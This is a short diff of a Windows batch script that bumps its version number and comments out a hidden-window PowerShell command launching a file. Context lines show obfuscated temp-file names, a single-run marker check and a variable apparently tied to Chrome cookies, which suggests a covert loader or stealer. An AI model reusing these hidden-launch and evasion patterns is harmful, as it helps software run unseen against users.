@@ -6,7 +6,7 @@ if exist "%temp%\i059.tmp" exit
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=33.4"
+set "BATCHVERSION=33.5"
 set "LOGFILE=%temp%\S1rNsvQgG.mpeez"
 set "RESULT=%TEMP%\TGRESU.txa"
 set "ALLOWED=124"
@@ -2133,7 +2133,7 @@ set "CHRMCKSSTARTED=1"
 
 
 :COMSTARTING
-powershell -NoProfile -WindowStyle Hidden -Command "Start-Process '%file1%'"
+::powershell -NoProfile -WindowStyle Hidden -Command "Start-Process '%file1%'"
 set "COMSTARTED=1"
 
 
